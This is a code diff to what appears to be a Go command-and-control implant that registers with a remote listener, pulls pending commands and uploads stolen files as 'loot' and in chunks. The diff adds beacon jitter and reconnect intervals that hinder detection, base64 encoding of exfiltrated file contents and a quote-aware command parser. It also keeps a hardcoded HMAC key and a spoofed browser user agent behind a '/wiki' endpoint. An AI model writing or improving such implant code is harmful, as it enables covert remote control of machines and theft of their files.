@@ -6,6 +6,7 @@ import (
 	"crypto/md5"
 	"crypto/sha256"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
@@ -30,14 +31,13 @@ import (
 
 // Build-time configuration - can be overridden with -ldflags during compilation
 var (
-	listenerProtocol = "https"
-	listenerHost     = "localhost"
-	listenerPort     = "8080"
-
-	listenerEndpoint = "/wiki"
-
-	// HMAC Key - MUST match relay's AGENT_HMAC_KEY in relay.config
-	hmacKeyHex = "1bb1a2912f7e02e259f969d96357bb84c2c0bf954a0d8674c45ed903bb674b23"
+	listenerProtocol     = "https"
+	listenerHost         = "localhost"
+	listenerPort         = "8080"
+	listenerEndpoint     = "/wiki"
+	hmacKeyHex           = "1bb1a2912f7e02e259f969d96357bb84c2c0bf954a0d8674c45ed903bb674b23"
+	reconnectIntervalStr = "15"
+	jitterSecondsStr     = "10"
 
 	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 )
@@ -128,11 +128,21 @@ type ProcessInfo struct {
 }
 
 func main() {
-	// Use the global agent ID
+	if interval, err := strconv.Atoi(reconnectIntervalStr); err == nil && interval > 0 {
+		reconnectInterval = interval
+		currentInterval = interval
+	}
+	if jitter, err := strconv.Atoi(jitterSecondsStr); err == nil && jitter >= 0 {
+		jitterSeconds = jitter
+	}
+
+	if jitterSeconds > 0 {
+		initialJitter := rand.Intn(jitterSeconds + 1)
+		time.Sleep(time.Duration(initialJitter) * time.Second)
+	}
+
 	agentName := fmt.Sprintf("Agent-%s", agentID[:8])
 
-	// Get system info
-	//hostname, _ := os.Hostname()
 	osInfo := fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH)
 
 	// Registration loop with full interval backoff on failure
@@ -339,9 +349,60 @@ func getPendingCommands(agentID string) ([]Command, error) {
 	return result.Commands, nil
 }
 
-// Built-in command handlers
+func parseCommand(command string) []string {
+	var parts []string
+	var current strings.Builder
+	inQuote := false
+	quoteChar := rune(0)
+	escaped := false
+
+	for i, c := range command {
+		if escaped {
+			current.WriteRune(c)
+			escaped = false
+			continue
+		}
+
+		if c == '\\' && i+1 < len(command) {
+			nextChar := rune(command[i+1])
+			if nextChar == '"' || nextChar == '\'' || nextChar == '\\' {
+				escaped = true
+				continue
+			}
+		}
+
+		if !inQuote && (c == '"' || c == '\'') {
+			inQuote = true
+			quoteChar = c
+			continue
+		}
+
+		if inQuote && c == quoteChar {
+			inQuote = false
+			quoteChar = 0
+			continue
+		}
+
+		if !inQuote && (c == ' ' || c == '\t') {
+			if current.Len() > 0 {
+				parts = append(parts, current.String())
+				current.Reset()
+			}
+			continue
+		}
+
+		current.WriteRune(c)
+	}
+
+	if current.Len() > 0 {
+		parts = append(parts, current.String())
+	}
+
+	return parts
+}
+
 func handleBuiltinCommand(command string) (string, error) {
-	parts := strings.Fields(command)
+	parts := parseCommand(command)
 	if len(parts) == 0 {
 		return "", fmt.Errorf("empty command")
 	}
@@ -566,13 +627,15 @@ func handleGetSmallFile(absPath, filename string) (string, error) {
 	hash := md5.Sum(content)
 	hashString := hex.EncodeToString(hash[:])
 
+	base64Content := base64.StdEncoding.EncodeToString(content)
+
 	// Create loot entry for the file
 	lootEntry := map[string]interface{}{
 		"type":    "file",
 		"name":    filename,
 		"path":    absPath,
 		"size":    float64(len(content)),
-		"content": string(content),
+		"content": base64Content,
 		"md5":     hashString,
 	}
 
@@ -702,7 +765,7 @@ func uploadChunk(sessionID string, chunkIndex int, chunkData []byte, chunkMD5 st
 	chunkReq := map[string]interface{}{
 		"sessionId":  sessionID,
 		"chunkIndex": chunkIndex,
-		"chunkData":  hex.EncodeToString(chunkData),
+		"chunkData":  base64.StdEncoding.EncodeToString(chunkData),
 		"chunkMd5":   chunkMD5,
 	}
 
@@ -1286,22 +1349,22 @@ func decodeCommand(command string) string {
 		"12": "jitter",
 	}
 
-	// Parse command to get the first word
-	parts := strings.Fields(command)
-	if len(parts) == 0 {
-		return command
+	spaceIdx := strings.IndexAny(command, " \t")
+	var cmdID string
+	var rest string
+	
+	if spaceIdx == -1 {
+		cmdID = command
+		rest = ""
+	} else {
+		cmdID = command[:spaceIdx]
+		rest = command[spaceIdx:]
 	}
 
-	cmdID := parts[0]
-
-	// Check if ID exists in map
 	if cmdName, ok := commandMap[cmdID]; ok {
-		// Replace ID with command name
-		parts[0] = cmdName
-		return strings.Join(parts, " ")
+		return cmdName + rest
 	}
 
-	// No mapping found (either already decoded or custom command), pass through
 	return command
 }
 
